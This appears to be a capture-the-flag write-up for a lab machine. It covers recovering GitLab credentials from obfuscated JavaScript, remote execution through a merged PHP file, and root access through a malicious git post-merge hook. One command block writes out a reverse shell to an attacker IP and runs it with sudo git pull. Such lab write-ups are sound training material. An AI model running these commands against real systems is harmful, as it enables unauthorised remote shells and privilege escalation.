# ENUMERATION

## NMAP

So,... let's first start NMAP:

```
Nmap scan report for 10.10.10.114
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION

```

Port 80 is only interesting port to continue enumerating

## GOBUSTER

## Checking Webserver manually

So there to be a bookmark html file that seems like a leak

# EXPLOITATION

## JS Deobfuscation

"Gitlab Login" seems to store credentials for Gitlab but the script is obfuscation. Just throwing it into [jsnice.org](http://jsnice.org) (can be done manually as well!) reveals the password.

![](/assets/images/image (171).png)

Credentials work for Gitlab on Port 80

## GitLab Missconfiguration

After checking both repositories on GitLab after logging in it seems that "Deployer" repository does few things including sudo git pull.

![](/assets/images/image (172).png)

Some IFs have to be met though so let's do that.

Let's go to Profile repo and create new master branch.

![](/assets/images/image (173).png)

Add new File to it

![](/assets/images/image (174).png)

Put code inside (PHP)

![](/assets/images/image (175).png)

Create merge request next, request merge and merge without making any changes.

If everything has been done correctly you should see something like this:

![](/assets/images/image (176).png)

And file is also in its place

![](/assets/images/image (177).png)

.... and remote execution works

![](/assets/images/image (178).png)

Swap that with reverse shell:

![](/assets/images/image (179).png)

And shell was popped:

![](/assets/images/image (180).png)

There are two privilege escalation possibilities. One is exploiting that sudo git pull, other one is finishing code found in snippets in GitLab to get clave users credentials.&#x20;

# PRIVILEGE ESCALATION

## PrivEsc#1: Git pull may be run as sudo

Let's first start with "sudo git pull"

I used post-merge hook since that was only one working - pre-commit didn't work. I didn't dig deeper to see if pre-commit gets executed or not though.

NOTE: since we need to copy whole repository to somewhere where we have write access to, we need to make a change in the repository otherwise pull wont work. So just create a single file like below:

![](/assets/images/image (181).png)

Copy the repostiory to /tmp and create a weaponized post-merge hook.

```
cp -r /var/www/html/profile/ /tmp/
		
echo '#!/bin/bash' > /tmp/profile/.git/hooks/post-merge
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.10/4243 0>&1"' >> /tmp/profile/.git/hooks/post-merge
chmod +x /tmp/profile/.git/hooks/post-merge
		
sudo /usr/bin/git pull
```

Root:

## PrivEsc#2: PostGRE

Snippet can be found in GitLab in snippets menu.

![](/assets/images/image (183).png)

Code is just missing a line which prints the results.

![](/assets/images/image (184).png)

Password with username was retrieved

![](/assets/images/image (185).png)

After SSHing onto the box with clave, there is file called "RemoteConnection.exe" in the clave's home directory. I pulled that file to windows and used it with x32dbg. (didn't work ghidra, or dnspy 64 bit!)

## PrivEsc#2: x32dbg (retrieving password from the stack)

File will put root's password onto the stack at some point.

![](/assets/images/image (186).png)

It works with SSH, i didn't try to run the file directly :)
